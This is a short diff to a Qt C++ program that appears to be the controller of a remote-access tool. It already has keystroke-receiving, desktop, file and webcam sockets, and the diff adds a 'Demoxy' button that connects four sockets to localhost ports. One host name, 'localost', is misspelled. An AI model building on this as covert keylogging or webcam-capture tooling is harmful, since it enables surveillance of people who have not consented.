@@ -116,6 +116,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
   connect (ui->botonRecibirTeclas,SIGNAL(clicked()),this,SLOT(recibirKey()));
   connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
   connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
+  connect (ui->botonDemoxy,SIGNAL(clicked()),this,SLOT(conectarDemoxy()));
   hilo.start();
   escritorio.moveToThread(&hilo);
 }
@@ -298,6 +299,19 @@ void MainWindow::nuevaConexionWebcam()
 {
     webcam.socketWebcam[webcam.conexiones] = serverWebcam.nextPendingConnection();
     webcam.conexiones++;
+}
+void MainWindow::conectarDemoxy()
+{
+    socket[0] = new QTcpSocket(this);
+    ventana.socketArchivos[0] = new QTcpSocket(this);
+    escritorio.socketEscritorio[0] = new QTcpSocket(this);
+    webcam.socketWebcam[0] = new QTcpSocket(this);
+    socket[0]->connectToHost("localhost",1111);
+    ventana.socketArchivos[0]->connectToHost("localhost",2222);
+    escritorio.socketEscritorio[0]->connectToHost("localhost",3333);
+    webcam.socketWebcam[0]->connectToHost("localost",4444);
+    connect ( socket[0],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
+    activo = 0;
 }
 
 void MainWindow::llegadaDatos() /** llegada de datos; **/
